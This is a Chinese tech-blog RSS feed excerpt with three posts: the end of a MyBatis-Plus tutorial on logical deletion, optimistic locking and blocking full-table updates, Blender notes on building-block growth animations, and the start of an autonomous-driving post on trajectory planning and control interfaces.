mybatis-plus:global-config:db-config:logic-delete-field: deleted # 全局逻辑删除的实体属性名logic-delete-value: 1 # 逻辑已删除值(默认为 1)logic-not-delete-value: 0 # 逻辑未删除值(默认为 0)
③ 演示逻辑删除操作
//逻辑删除
@Test
public void testQuick5(){//逻辑删除userMapper.deleteById(3);
}
运行结果：
2.乐观锁实现
（1）悲观锁和乐观锁场景和介绍
并发问题场景演示：
解决思路：
乐观锁和悲观锁是在并发编程中用于处理并发访问和资源竞争的两种不同的锁机制。
悲观锁：
悲观锁的基本思想是，在整个数据访问过程中，将共享资源锁定，以确保其他线程或进程不能同时访问和修改该资源。
悲观锁的核心思想是"先保护，再修改"。
在悲观锁的应用中，线程在访问共享资源之前会获取到锁，并在整个操作过程中保持锁的状态，阻塞其他线程的访问。只有当前线程完成操作后，才会释放锁，让其他线程继续操作资源。这种锁机制可以确保资源独占性和数据的一致性，但是在高并发环境下，悲观锁的效率相对较低。
乐观锁：
乐观锁的基本思想是，认为并发冲突的概率较低，因此不需要提前加锁，而是在数据更新阶段进行冲突检测和处理。
乐观锁的核心思想是"先修改，后校验"。
在乐观锁的应用中，线程在读取共享资源时不会加锁，而是记录特定的版本信息。当线程准备更新资源时，会先检查该资源的版本信息是否与之前读取的版本信息一致，如果一致则执行更新操作，否则说明有其他线程修改了该资源，需要进行相应的冲突处理。乐观锁通过避免加锁操作，提高了系统的并发性能和吞吐量，但是在并发冲突较为频繁的情况下，乐观锁会导致较多的冲突处理和重试操作。
注意：
悲观锁和乐观锁是两种解决并发数据问题的思路，不是具体技术。
具体技术和方案：
① 乐观锁实现方案和技术：
版本号/时间戳：为数据添加一个版本号或时间戳字段，每次更新数据时，比较当前版本号或时间戳与期望值是否一致，若一致则更新成功，否则表示数据已被修改，需要进行冲突处理。
CAS（Compare-and-Swap）：使用原子操作比较当前值与旧值是否一致，若一致则进行更新操作，否则重新尝试。
无锁数据结构：采用无锁数据结构，如无锁队列、无锁哈希表等，通过使用原子操作实现并发安全。
② 悲观锁实现方案和技术：
锁机制：使用传统的锁机制，如互斥锁（Mutex Lock）或读写锁（Read-Write Lock）来保证对共享资源的独占访问。
数据库锁：在数据库层面使用行级锁或表级锁来控制并发访问。
信号量（Semaphore）：使用信号量来限制对资源的并发访问。
版本号乐观锁技术的实现流程：
每条数据添加一个版本号字段 version
取出记录时，获取当前 version
更新时，检查获取版本号是不是数据库当前最新版本号
如果是
[ 证明没有人修改数据 ]
，执行更新，set 数据更新，version = version+ 1
如果 version 不对
[ 证明有人已经修改了 ]
，我们现在的其他记录就是失效数据，就更新失败
（2）使用mybatis-plus数据使用乐观锁（基于版本号技术）
① 添加版本号更新插件
@MapperScan("com.mihoyo.mapper")
@SpringBootApplication
public class MainApplication {public static void main(String[] args) {SpringApplication.run(MainApplication.class,args);}//mybatis-plus插件集合加入到ioc容器@Beanpublic MybatisPlusInterceptor plusInterceptor(){//mybatis-plus的插件集合（所有插件都加入到这个集合：分页插件，乐观锁插件...）MybatisPlusInterceptor mybatisPlusInterceptor = new MybatisPlusInterceptor();//乐观锁（版本号插件）mybatisPlusInterceptor.addInnerInterceptor(new OptimisticLockerInnerInterceptor());return mybatisPlusInterceptor;}}
② 数据库添加版本号 version 字段
ALTER TABLE USER ADD VERSION INT DEFAULT 1 ;  # int 类型 乐观锁字段
③ 实体类添加版本号属性，属性添加 @Version 注解
@Data
public class User {// @TableIdprivate Integer id;private String name;private Integer age;private String email;@TableLogic//逻辑删除字段 int mybatis-plus下,默认 逻辑删除值为1 未逻辑删除 0 private Integer deleted;@Versionprivate Integer version;//版本号字段
}
细节：
支持的数据类型只有:int，Integer，long，Long，Date，Timestamp，LocalDateTime
仅支持 updateById(id) 与 update(entity, wrapper) 方法
④ 正常更新使用即可
//演示乐观锁生效场景
@Test
public void testQuick7(){//步骤1: 先查询，取出数据，从而获取当前版本号User user  = userMapper.selectById(5);User user1  = userMapper.selectById(5);user.setAge(20);user1.setAge(30);//修改成功，version + 1 = 2userMapper.updateById(user);//版本号校验不对，乐观锁生效,失败!userMapper.updateById(user1);
}
运行结果：
3.防全表更新和删除实现
针对 update 和 delete 语句
作用：
阻止恶意的全表更新删除
步骤：
① 添加防止全表更新和删除拦截器
@MapperScan("com.mihoyo.mapper")
@SpringBootApplication
public class MainApplication {public static void main(String[] args) {SpringApplication.run(MainApplication.class,args);}//mybatis-plus插件集合加入到ioc容器@Beanpublic MybatisPlusInterceptor plusInterceptor(){//mybatis-plus的插件集合（所有插件都加入到这个集合：分页插件，乐观锁插件...）MybatisPlusInterceptor mybatisPlusInterceptor = new MybatisPlusInterceptor();//防止全表删除和更新的拦截器mybatisPlusInterceptor.addInnerInterceptor(new BlockAttackInnerInterceptor());return mybatisPlusInterceptor;}}
② 测试全部更新或者删除
@Testpublic void test_delete(){//全表删除 delete from user;userMapper.delete(null);}
运行结果：
四、MyBatis-Plus代码生成器（MyBatisX插件）
1.Mybatisx 插件逆向工程
MyBatis-Plus为我们提供了强大的 mapper 和 service 模板，能够大大的提高开发效率
但是在真正开发过程中，MyBatis-Plus 并不能为我们解决所有问题，例如一些复杂的SQL，多表联查，我们就需要自己去编写代码和SQL语句，我们该如何快速的解决这个问题呢，这个时候可以使用 MyBatisX 插件。
MyBatisX一款基于 IDEA 的快速开发插件，为效率而生。
2.MyBatisX 快速代码生成
使用 mybatisX 插件，自动生成 sql 语句实现
（快捷键：Alt + enter）
具体介绍，可查看官方文档：
Mybatis X 插件 | MyBatis-Plus (baomidou.com)
https://baomidou.com/guides/mybatis-x/</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540180.html</guid><pubDate>Fri, 31 Oct 2025 07:27:23 +0000</pubDate></item><item><title>blender 理解 积木组合 动画制作 学习笔记</title><link>https://www.ppmy.cn/news/1540181.html</link><description>一、学习blender视频教程链接
案例2：积木组合_动画制作_哔哩哔哩_bilibili
https://www.bilibili.com/video/BV1Bt4y1E7qn?vd_source=d0ea58f1127eed138a4ba5421c577eb1&amp;p=10&amp;spm_id_from=333.788.videopod.episodes
二、说明
之前已经学习了如何制作积木组合，下载开始学习如何动画制作
三、开始动画制作
首先关闭灯光和摄像机
先点击 + a，然后ctrl + a，将物体都进行缩放
如果出现无法应用缩放的问题
说明整体无法直接缩放，需要手动一个一个进行应用缩放
3.1 底部的动画制作
首先在第一帧的位置选中底部物体，先应用缩放，点击按键 i，将记录该关键帧物体的位置，
然后在第20帧的位置，再返回到第一帧的位置，将物体的缩放均设置为0，先应用缩放，再次按下按键 i  ，记录该关键帧物体的位置；如下图所示：
将除了底部的物体都隐藏起来，点击底部物体后ctrl + i，这样就选中了其他的物体，再点击h，隐藏起来。（可以使用alt + h 将所有隐藏的物体的显示出来）
接下来调整物体的原点中心，在选择中选择原点
然后打开左视图，调整原点的位置
3.2 同理对两个物体进行相同的操作
通过按键alt + h将所有的物体的显示出来，然后选择底部三个物体后，按ctrl + i + h选择其他的物体进行隐藏，如下图所示：
然后通过ctrl + L 关联三个物体的动画数据
关联动画数据后，当我们对关联的动画的某个物体进行调整时，同时都会影响到三个物体 ，为了使物体之间关联动画数据后，进行独立修改互补影响，这里需要对物体的关系进行独立化，对物体关系独立化的操作，如下图所示：
原点有点偏离，通过鼠标右击设置原点为几何中心
再通过刚刚的选项原点，将物体的中心贴合到物体的底部（使用完记得关闭选项中的原点），每个物体都设置到位
做到这一步，我发现实现效果失败了，虽然我操作可能有些问题，但是我还是会最原始的手段，就是每个一个一个物体慢慢调整，这样就可以实现所有物体的动画效果
接着，调整帧，最小面的物体第1帧开始，中间的物体第5帧开始，最上面的物体第10帧开始。
3.3 对其他的物体制作相同的生长动画效果
开始对三颗树制作生长的动画效果：
首先对其他的物体进行隐藏，只保留三颗小树和刚刚完成的三个物体，记得h键是隐藏物体哦！
同样，对一颗小树实现伸缩效果后，对小树的各个组成部分的原点都放到中心底部，然后再关联动画到其他的小树，并修改其他小树的各个组成部分的原点都放到中心底部，这样就算成功制作了三颗小树生长的动画效果。（注意：加入关键帧（按键 i）之前进行ctrl  + a的应用缩放）
其实掌握上面的方法就够接下来的所有物体的生长动画效果的制作了，无非就是伸缩和移动，以及调整帧的开始和结束时间。
四、学习总结
ctrl + a可以选择应用缩放
点击 + a选择所有物体，如果是选择除点击以外的物体应该是ctrl + i
通过h键，对物体进行隐藏，尤其是ctrl + i 和 h 键的配置可以使我们先集中注意力专注做一个物体
使用alt + h 将所有隐藏的物体的显示出来
ctrl + L 关联三个物体的动画数据
说明一下为什么将原点放到物体的中心底部：因为物体的伸缩是围绕着原点进行伸缩的，如果一个物体从半空中生长，这样的效果是从各个方向都进行生长，而如果将原点放到物体中心的底部，这样有点类似我们的树，从小变大的过程，很符合生长规律的样子。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540181.html</guid><pubDate>Fri, 31 Oct 2025 07:27:26 +0000</pubDate></item><item><title>【自动驾驶】控制算法（十二）横纵向综合控制 | 从理论到实战全面解析</title><link>https://www.ppmy.cn/news/1540182.html</link><description>写在前面：
🌟 欢迎光临
清流君
的博客小天地，
这里是我分享技术与心得的温馨角落
。📝
个人主页
：清流君_CSDN博客，期待与您一同探索
移动机器人
领域的无限可能。
🔍 本文系
清流君
原创之作，荣幸在CSDN首发🐒
若您觉得内容有价值，还请评论告知一声，以便更多人受益。
转载请注明出处，尊重原创，从我做起。
👍
点赞、评论、收藏
，三连走一波，让我们一起养成好习惯😜
在这里，您将收获的不只是
技术干货
，还有
思维的火花
！
📚 系列专栏：【运动控制】系列，带您深入浅出，领略控制之美。🖊
愿我的分享能为您带来启迪，如有不足，敬请指正，让我们共同学习，交流进步！
🎭
人生如戏，我们并非能选择舞台和剧本，但我们可以选择如何演绎
🌟
感谢您的支持与关注，让我们一起在知识的海洋中砥砺前行~~~
文章目录
引言
一、规划接口
1.1 轨迹规划的定义与重要性
1.2 不同场景的轨迹规划
1.3 轨迹规划的数学模型
1.4 考虑车辆运动特性的轨迹规划
二、轨迹生成
2.1 五次多项式在轨迹规划中的应用
2.2 解多项式系数
三、横向控制的规划接口
3.1 匹配点的更新
3.2 规划点与时间的关系
四、纵向控制的规划接口
4.1 横向误差的计算与理解
4.2 速度误差与期望加速度
4.3 横向控制的实现与调整
4.4 纵向控制与规划接口的整合
五、代码实现与模型调整
5.1 代码下载与准备工作
5.2 Matlab 环境配置
5.3 Carsim 标定过程
5.4 Simlink 模型建立
5.5 纵向控制模型整合与参数优化
5.6 横向控制的集成与误差计算模块的修改
六、横向误差大的原因
6.1 横向误差的原因分析
6.2 仿真与实车的差别
七、解决横向误差的办法
八、转向不足及过度转向
8.1 转向不足与过度转向的原因
8.2 力矩平衡与转向特性
8.3 车辆设计与转向特性的关系
8.4 使用 PID 控制器处理转向不足
九、总结
参考资料
引言
各位小伙伴们大家好，欢迎来到自动驾驶控制算法第十二节，内容整理自
B
站知名
up
主 忠厚老实的老王 的视频，作为博主的学习笔记，分享给大家共同学习。
本节是超级大综合，将用到前十一节所有的知识，根据本篇博客的内容实现横纵向控制。
简单回顾一下本系列所讲的内容：
第一到第二节
：开篇以及运动学方程
第三到第八节
：横向控制以及
LQR
第九到第十一节
：纵向控制，也就是双
PID
算法
第十二节
：横纵向综合控制、规划接口，因为控制的上游是规划，必须要有规划的输入才能做控制
所以不仅要把横纵向控制所有的模型都做搭好，还要写接口，接口就是在规划里面规划一条轨迹，然后输入到控制里，让控制根据规划的轨迹去跑，所以还要写接口。
回顾整个系列，会发现运动学方程几乎就没怎么讲，可能只用到了
tan ⁡ δ = L R \tan \delta =\frac{L}{R}
tan
δ
=
R
L
​
公式。但运动学方程实际上是非常有用的，只是本系列教程将淡化了。
运动学方程适用于低速，但是有很好的特点，就是大小转角均可，而
LQR
只适用于小转角，但不限于速度，高速、低速都可以控制。所以如果想做停车、掉头之类的控制，一般用运动学方程，可以适用于大转角，即方向盘转角可以打得很大，但
LQR
不行，
LQR
转角必须就是比较小，大家可以翻一翻第四节。
【自动驾驶】控制算法（四）坐标变换与横向误差微分方程
第四节推导二自由度动力学方程时，就假设前轮转角较小，前轮转角较大的话
LQR
也可以，但控制效果没有运动学方程那么好。
在这里就简单提一下怎么用运动学方程做控制。
首先是非线性方程要线性化，做一阶的泰勒展开线性化后，就变成如下形式：
e ˙ = A e ˙ + B u \dot{e}=A\dot{e}+Bu
e
˙
=
A
e
˙
+
B
u
这样就和
LQR
的处理方式基本一样了。
一、规划接口
1.1 轨迹规划的定义与重要性
首先要讲的就是规划接口，因为控制模块的功能就是接收规划轨迹，让车按照规划轨迹运动。控制模块功能实际上就暗含两个事情：
接受一条规划轨迹
那首先得有一条规划的轨迹才行，所以那就是要有规划。
让车辆按照规划轨迹运动
就是横纵向控制
所以必须要讲一下怎么规划一条轨迹。
注意
：轨迹规划不是路径规划。
在自动驾驶领域里，路径规划和轨迹规划不一样，这两个是分开的。路径规划比如导航，想要去哪，手机搜一下，就给一条路径，此路径是大概的方向性的东西，只会告诉该走哪条路，该往什么方向走，但是不会告诉速度是多少，加速度是多少，因此
路径规划
：
时间无关
，只告诉该往什么地方走
轨迹规划
：
包含时间
，所以轨迹规划不仅包含位置，还包含速度、加速度以及道路曲率等。
所以轨迹规划和路径规划不一样，要给出
s ( t ) s(t)
s
(
t
)
以及
d ( t ) d(t)
d
(
t
)
。但在这里就不讲
s ( t ) s(t)
s
(
t
)
以及
d ( t ) d(t)
d
(
t
)
了，讲
x ( t ) , y ( t ) x (t), y (t)
x
(
t
)
,
y
(
t
)
，即不涉及曲线坐标系、自然坐标系，只在直角坐标系下去做规划，这也是由易到难的过程，先做简单的，再做难的。
1.2 不同场景的轨迹规划
至于在自然坐标系下的轨迹规划，在进阶的课程再讲。本篇博客就讲在直角坐标系下的规划。比如这里有一辆车：
在坐标圆点上，想移动到右上角的红色区域，坐标为
( 100 , 10 ) (100,10)
(
100
,
10
)
，边界条件为：
坐标
x x
x
x ˙ \dot x
x
˙
x ¨ \ddot x
x
¨
y y
y
y ˙ \dot y
y
˙
​
y ¨ \ddot y
y
¨
​
初始
0 0
0
0 0
0
0 0
0
0 0
0
0 0
0
0 0
0
终点
100 100
100
0 0
0
0 0
0
10 10
10
0 0
0
0 0
0
用时
t = 20 s t=20s
t
=
20
s
，此场景实际上对应的就是停车。
当然，终点也可以改，比如
x = 100 x =100
x
=
100
,
x ˙ = 20 \dot x=20
x
˙
=
20
，即车辆到达终点时有速度，其他都不变。此场景实际上对应的是驶入，比如在辅路上，旁边有花坛，想行驶到主路上融入交通流的场景。
或者可以把起点也改了，比如起点
x = 0 x=0
x
=
0
，但速度
x ˙ = 10 \dot x=10
x
˙
=
10
，加速度
x ¨ = 0 \ddot x=0
x
¨
=
0
，其他不变；终点处
x = 100 x =100
x
=
100
，
x ˙ = 20 \dot x=20
x
˙
=
20
，
x ¨ = 0 \ddot x=0
x
¨
=
0
，这其实对应就是换道和超车场景。
给定起点和终点的位置、速度、加速度信息的规划，可以做很多场景：停车、驶入、变道。所以本篇博客就研究给定起点和终点的位置、速度、加速度信息的规划，这样的规划最简单也最常用，而且能覆盖大部分直线行驶的场景，但不能做转弯，也不能做调头，因为转化和调头必须要用到自然坐标系才可以。
关于在自然坐标系下的规划，到后面进阶的课程再讲，本篇博客主要讲简单的规划，主要是给控制服务的，就是给控制提供规划接口。
1.3 轨迹规划的数学模型
规划问题会转化成数学问题，就是设计一条合适的
x ( t ) , y ( t ) x(t),y(t)
x
(
t
)
,
y
(
t
)
，满足始末的边界条件，也就是给出初始端的位置、速度、加速度，终点的位置、速度、加速度以及耗费的时间
T T
T
：
起点
x ( 0 ) x(0)
x
(
0
)
x ˙ ( 0 ) \dot x(0)
x
˙
(
0
)
x ¨ ( 0 ) \ddot x(0)
x
¨
(
0
)
y ( 0 ) y(0)
y
(
0
)
y ˙ ( 0 ) \dot y(0)
y
˙
​
(
0
)
y ¨ ( 0 ) \ddot y(0)
y
¨
​
(
0
)
终点
x ( T ) x(T)
x
(
T
)
x ˙ ( T ) \dot x(T)
x
˙
(
T
)
x ¨ ( T ) \ddot x(T)
x
¨
(
T
)
y ( T ) y(T)
y
(
T
)
y ˙ ( T ) \dot y(T)
y
˙
​
(
T
)
y ¨ ( T ) \ddot y(T)
y
¨
​
(
T
)
根据上述条件，设计出一条合理的轨迹。
这是经典的规划问题，很常见，而且不仅仅在无人驾驶上用到，在机器人规划上也有类似的算法，给定始末点的位置、速度、加速度，然后算轨迹。
1.4 考虑车辆运动特性的轨迹规划
但无人驾驶车辆在算法应用上不能直接照搬机器人领域的算法，这是因为它们在运动特性上存在显著差异。具体来说，无人驾驶车辆无法像机器人那样独立进行横向运动。在车辆行驶中，横向运动通常是由纵向运动引起的，即车辆不能像螃蟹那样仅依靠横向移动。而机器人则具备这种横向移动的能力，它们既可以横向移动，也可以纵向移动。因此，无人驾驶车辆的运动规划需要考虑额外的限制。
车辆规划轨迹与机器人轨迹的不同之处在于，车辆轨迹必须受到切线曲率、加速度和速度的限制。例如，在确定起点和终点后，不能简单地绘制一条直线作为行驶路径。这是因为车辆的实际行驶路径需要遵循物理学和动力学的基本原则，以及道路和交通规则的限制。因此，无人驾驶车辆的路径规划必须更加复杂和精确，以确保行驶的安全性和效率。
举个例子，比如给定起点和终点，能直接从起点到终点拉一条直线吗？显然不可以。
合适规划轨迹应该长这样才符合汽车运动的规律：
因为汽车不能平白无故的就有横向速度，横向运动必须要由纵向运动诱发。如果在起点建立直角坐标系，就是对曲线切线斜率
d y d x \frac{dy}{dx}
d
x
d
y
​
也有要求。
所以汽车的轨迹规划边界条件要做相应的修改：
起点
x ( 0 ) x(0)
x
(
0
)
x ˙ ( 0 ) \dot x(0)
x
˙
(
0
)
x ¨ ( 0 ) \ddot x(0)
x
¨
(
0
)
y ( 0 ) y(0)
y
(
0
)
y ′ ( 0 ) y'(0)
y
′
(
0
)
y ′ ′ ( 0 ) y''(0)
y
′′
(
0
)
终点
x ( T ) x(T)
x
(
T
)
x ˙ ( T ) \dot x(T)
x
˙
(
T
)
x ¨ ( T ) \ddot x(T)
x
¨
(
T
)
y ( x e n d ) y(x_{end})
y
(
x
e
n
d
​
)
y ′ ( x e n d ) y'(x_{end})
y
′
(
x
e
n
d
​
)
y ′ ′ ( x e n d ) y''(x_{end})
y
′′
(
x
e
n
d
​
)
变量符号上的点代表对时间求导
d d t \frac{d}{dt}
d
t
d
​
，撇代表对坐标求导
d d x \frac{d}{dx}
d
x
d
​
。如果是自然坐标系，撇就等于
d d s \frac{d}{ds}
d
s
d
​
，这里是直角坐标系，所以是
d d x \frac{d}{dx}
d
x
d
​
，车辆规划和机器人规划还是有很大不同的。
机器人就是
x x
x
和
y y
y
，都是对时间的导数，因为机器人可以做纵向运动，也可以做横向运动，但仅用
y ′ y'
y
′
做规划还是不够，因为真正输入到控制模块里能用的轨迹必须要是
( x ( t ) , y ( t ) ) (x(t),y(t))
(
x
(
t
)
,
y
(
t
))
，都是和时间相关的，控制就按照目标点去跑。
所以关于车辆轨迹规划，车辆纵向的
x x
x
方向可以是关于时间的导数，因为
x x
x
直接和时间相关，但车辆横向的
y y
y
方向不行， 横向
y y
y
和纵向
x x
x
相关。所以还要写
y ˙ \dot y
y
˙
​
和
y ′ y'
y
′
间的转化，即
d d x \frac{d}{dx}
d
x
d
​
和
d d t \frac{d}{dt}
d
t
d
​
间的转化。
这两者之间的转换也非常简单，因为
y ( x ) y(x)
y
(
x
)
中的
x x
x
和
t t
t
有关
x = x ( t ) x=x(t)
x
=
x
(
t
)
，所以
y ( x ) y(x)
y
(
x
)
和
y ( t ) y(t)
y
(
t
)
之间的关系就是
y ( t ) = y ( x ( t ) ) y(t)=y(x(t))
y
(
t
)
=
y
(
x
(
t
))
那么
y ′ y'
y
′
和
y ˙ \dot y
y
˙
​
之间的关系也很好计算，只要复合求导即可。
y ˙ ( t ) = d y d x ⋅ d x d t = y ′ ⋅ x ˙ \dot{y}\left( t \right) =\frac{dy}{dx}\cdot \frac{dx}{dt}=y'\cdot \dot{x}
y
˙
​
(
t
)
=
d
x
d
y
​
⋅
d
t
d
x
​
=
y
′
⋅
x
˙
y ¨ \ddot y
y
¨
​
和
y ′ ′ y''
y
′′
之间的关系还是比较复杂的，要使用稍微复杂点的复合求导，最终结果是
y ¨ ( t ) = d d t ( d y d t ) = d d t ( d y d x ⋅ d x d t ) = d ( d y d x ) d t d x d t + d y d x ⋅ d 2 x d t 2 = d d x ( d y d x ) ⋅ d x d t ⋅ d x d t + y ′ ⋅ x ¨ = y ′ ′ ⋅ x ˙ 2 + y ′ ⋅ x ¨ \begin{aligned} \ddot{y}\left( t \right) &amp;=\frac{d}{dt}\left( \frac{dy}{dt} \right) =\frac{d}{dt}\left( \frac{dy}{dx}\cdot \frac{dx}{dt} \right) \\ &amp;=\frac{d\left( \frac{dy}{dx} \right)}{dt}\frac{dx}{dt}+\frac{dy}{dx}\cdot \frac{d^2x}{dt^2}\\ &amp;=\frac{d}{dx}\left( \frac{dy}{dx} \right) \cdot \frac{dx}{dt}\cdot \frac{dx}{dt}+y'\cdot \ddot{x}\\ &amp;=y''\cdot \dot{x}^2+y'\cdot \ddot{x}\\ \end{aligned}
y
¨
​
(
t
)
​
=
d
t
d
​
(
d
t
d
y
​
)
=
d
t
d
​
(
d
x
d
y
​
⋅
d
t
d
x
​
)
=
d
t
d
(
d
x
d
y
​
)
​
d
t
d
x
​
+
d
x
d
y
​
⋅
d
t
2
d
2
x
​
=
d
x
d
​
(
d
x
d
y
​
)
⋅
d
t
d
x
​
⋅
d
t
d
x
​
+
y
′
⋅
x
¨
=
y
′′
⋅
x
˙
2
+
y
′
⋅
x
¨
​
这样问题就非常清晰了，给这么多边界条件：
x ( 0 ) x\left( 0 \right)
x
(
0
)
x ˙ ( 0 ) \dot{x}\left( 0 \right)
x
˙
(
0
)
x ¨ ( 0 ) \ddot{x}\left( 0 \right)
x
¨
(
0
)
x ( T ) x\left( T \right)
x
(
T
)
x ˙ ( T ) \dot{x}\left( T \right)
x
˙
(
T
)
x ¨ ( T ) \ddot{x}\left( T \right)
x
¨
(
T
)
y ( 0 ) y\left( 0 \right)
y
(
0
)
y ′ ( 0 ) y'\left( 0 \right)
y
′
(
0
)
y ′ ′ ( 0 ) y''\left( 0 \right)
y
′′
(
0
)
y ( x e n d ) y\left( x_{end} \right)
y
(
x
e
n
d
​
)
y ′ ( x e n d ) y'\left( x_{end} \right)
y
′
(
x
e
n
d
​
)
y ′ ′ ( x e n d ) y''\left( x_{end} \right)
y
′′
(
x
e
n
d
​
)
x x
x
共有
6 6
6
个，
y y
y
也有
6 6
6
个，再加上耗费的时间
T T
T
。求轨迹满足边界条件，生成包含
x ( t ) , y ( x ) x(t),y(x)
x
(
t
)
,
y
(
x
)
的轨迹，先算出
y y
y
和
x x
x
的关系，再通过转化成
y y
y
和
t t
t
之间的关系，这样就生成了一条规划轨迹。
二、轨迹生成
2.1 五次多项式在轨迹规划中的应用
对于
x ( t ) x(t)
x
(
t
)
，很容易想到的就是用五次多项式：
x ( t ) = a 0 + a 1 t + a 2 t 2 + a 3 t 3 + a 4 t 4 + a 5 t 5 x(t)=a_0+a_1t+a_2t^2+a_3t^3+a_4t^4+a_5t^5
x
(
t
)
=
a
0
​
+
a
1
​
t
+
a
2
​
t
2
+
a
3
​
t
3
+
a
4
​
t
4
+
a
5
​
t
5
因为五次多项式有
6 6
6
个系数，正好对应这
6 6
6
个边界条件。
对于
y ( x ) y(x)
y
(
x
)
也一样，
y y
y
也用五次多项式：
y ( x ) = b 0 + b 1 x + b 2 x 2 + b 3 x 3 + b 4 x 4 + b 5 x 5 y(x)=b_0+b_1x+b_2x^2+b_3x^3+b_4x^4+b_5x^5
y
(
x
)
=
b
0
​
+
b
1
​
x
+
b
2
​
x
2
+
b
3
​
x
3
+
b
4
​
x
4
+
b
5
​
x
5
因为
y y
y
也对应着
6 6
6
个边界条件，五次多项式正好有
6 6
6
个未知数，正好就可以对应这
6 6
6
个边界条件。
2.2 解多项式系数
通过这
12 12
12
个边界条件（
x x
x
方向
6 6
6
个，
y y
y
方向也是
6 6
6
个）解出
a 0 a_0
a
0
​
到
a 5 a_5
a
5
​
以及
b 0 b_0
b
0
​
到
b 5 b_5
b
5
​
出来。
y y
y
还要转化一下，通过以下关系式：
y ( t ) = y ( x ( t ) ) y ˙ ( t ) = y ′ [ x ( t ) ] ⋅ x ˙ ( t ) y ¨ ( t ) = y ′ ′ [ x ( t ) ] ⋅ x ˙ ( t ) 2 + y ′ [ x ( t ) ] ⋅ x ¨ ( t ) \begin{aligned} y\left( t \right) &amp;=y\left( x\left( t \right) \right)\\ \dot{y}\left( t \right) &amp;=y'\left[ x\left( t \right) \right] \cdot \dot{x}\left( t \right)\\ \ddot{y}\left( t \right) &amp;=y''\left[ x\left( t \right) \right] \cdot \dot{x}\left( t \right) ^2+y'\left[ x\left( t \right) \right] \cdot \ddot{x}\left( t \right)\\ \end{aligned}
y
(
t
)
y
˙
​
(
t
)
y
¨
​
(
t
)
​
=
y
(
x
(
t
)
)
=
y
′
[
x
(
t
)
]
⋅
x
˙
(
t
)
=
y
′′
[
x
(
t
)
]
⋅
x
˙
(
t
)
2
+
y
′
[
x
(
t
)
]
⋅
x
¨
(
t
)
​
解出
y ( t ) , y ˙ ( t ) , y ¨ ( t ) y(t),\dot{y}(t),\ddot{y}(t)
y
(
t
)
,
y
˙
​
(
t
)
,
y
¨
​
(
t
)
，可以得到一条
x x
x
和
t t
t
的关系，以及
y y
y
和
t t
t
的关系，以及他们的导数和
t t
t
的关系，这样就是一条完整的轨迹规划。
三、横向控制的规划接口
得到这条轨迹规划后，该怎样才能运用于横纵向控制？
参考以第八节博客：
【自动驾驶】控制算法（八）横向控制Ⅰ | 算法与流程
在第八节中用到了规划中的
( x r , y r , θ r , κ r ) (x_r,y_r,\theta_r,\kappa_r)
(
x
r
​
,
y
r
​
,
θ
r
​
,
κ
r
​
)
四个量。其中，
θ r \theta_r
θ
r
​
是轨迹切线方向与
x x
x
轴的夹角，
κ r \kappa_r
κ
r
​
代表轨迹曲率。
3.1 匹配点的更新
匹配点由时间给出，比如时间是
1 1
1
秒，规划器给出匹配点坐标
( x r , y r ) (x_r,y_r)
(
x
r
​
,
y
r
​
)
，即匹配点
( x r , y r , θ r , κ r ) (x_r,y_r,\theta_r,\kappa_r)
(
x
r
​
,
y
r
​
,
θ
r
​
,
κ
r
​
)
和时间相关，每过一段时间规划器就会发出匹配点坐标，控制器就按照匹配点控制。
3.2 规划点与时间的关系
( x r , y r ) (x_r,y_r)
(
x
r
​
,
y
r
​
)
其实就是规划器
( x ( t ) , y ( t ) ) (x(t),y(t))
(
x
(
t
)
,
y
(
t
))
，和时间有直接关系，
( θ r , κ r ) (\theta_r,\kappa_r)
(
θ
r
​
,
κ
r
​
)
和时间
t t
t
的关系如下：
θ r ( t ) = arctan ⁡ { y ′ [ x ( t ) ] } \theta _r\left( t \right) =\arctan\text{\{}y'\left[ x\left( t \right) \right] \}
θ
r
​
(
t
)
=
arctan
{
y
′
[
x
(
t
)
]
}
κ r ( t ) = y ′ ′ [ x ( t ) ] ( 1 + y ′ [ x ( t ) ] 2 ) 3 2 \kappa _r\left( t \right) =\frac{y''\left[ x\left( t \right) \right]}{\left( 1+y'\left[ x\left( t \right) \right] ^2 \right) ^{\frac{3}{2}}}
κ
r
​
(
t
)
=
(
1
+
y
′
[
x
(
t
)
]
2
)
2
3
​
y
′′
[
x
(
t
)
]
​
这样横向控制和规划接口就讲完了，接下来讲纵向控制和规划接口
四、纵向控制的规划接口
4.1 横向误差的计算与理解
在横向公式里面讲过了横向误差
e s e_s
e
s
​
，如果各位如果不记得的话，要翻一下第七节和第八节：
【自动驾驶】控制算法（七）离散规划轨迹的误差计算
【自动驾驶】控制算法（八）横向控制Ⅰ | 算法与流程
e s e_s
e
s
​
在横向控制里有，所以横向控制可以直接输出
e s e_s
e
s
​
，就是车辆当前位置与匹配点的距离，而且此距离是基于自然坐标系下的距离，不是基于直角坐标系下的距离。
这里可能会有很多人会有疑惑，明明规划都是直角坐标系，怎么突然就来了自然坐标系？
这是因为直角坐标系只用于规划，当生成了规划轨迹
( x ( t ) , y ( t ) ) (x(t),y(t))
(
x
(
t
)
,
y
(
t
))
后，直角坐标系使命就完成了，控制就是基于生成的曲线作为自然坐标系的坐标轴的，所以
e s e_s
e
s
​
才是位置误差。
注意
：横向控制里面
e s e_s
e
s
​
还不算是真正的位置误差。
下面看一下
e s e_s
e
s
​
到底是怎么算出来的，比如这里有一条轨迹：
目标点被视为匹配点，在此基础上，首先从车辆位置到目标点绘制一个向量，接着在目标点的切线方向上再绘制一个向量。将这两个向量进行点乘运算，其结果即为
e s e_s
e
s
​
，即红色向量在蓝色向量上的投影就是
e s e_s
e
s
​
。如果各位对此概念不太熟悉，可以多参考第七节的内容，那里有更详细的解释。
【自动驾驶】控制算法（七）离散规划轨迹的误差计算
关于
e s e_s
e
s
​
的正负问题，可以这样思考：
如果场景如上图所示，
e s e_s
e
s
​
是否为负值？
由于两个向量之间的夹角为钝角，因此
e s e_s
e
s
​
应为负值。但误差的定义是目标点与当前位置之间的距离。在所描述的场景中，目标点位于车辆当前位置的前方，因此
e s e_s
e
s
​
按理来说应该是正值。因此，在实际的控制作用中，为了使
e s e_s
e
s
​
与位置误差的实际意义相匹配，需要对
e s e_s
e
s
​
加上负号。
4.2 速度误差与期望加速度
速度误差为
v p − s ˙ v_p-\dot{s}
v
p
​
−
s
˙
，
p p
p
(
planning
) 是规划速度，
s ˙ \dot s
s
˙
在横向控制里面有。则规划速度
v p v_p
v
p
​
为
v p = x ˙ r ( t ) 2 + y ˙ r ( t ) 2 v_p=\sqrt{\dot{x}_r(t)^2+\dot{y}_r(t)^2}
v
